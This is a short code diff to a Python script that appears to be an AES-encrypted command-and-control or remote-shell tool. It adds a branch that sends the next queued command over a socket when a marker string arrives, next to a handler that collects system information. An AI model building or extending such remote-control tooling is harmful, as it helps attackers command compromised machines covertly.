@@ -178,6 +178,10 @@ while True:
 		newpwd = False
 		fnextcmd()
 
+	elif decrypted.endswith('***^^'):
+		encrypted = EncodeAES(cipher, nextcmd)
+		s.send(encrypted)
+
 	elif decrypted.endswith('*' * 16):							## Get system info
 		opsys = decrypted[64:128].strip('*')
 		pwd = decrypted[144:208].strip('*')
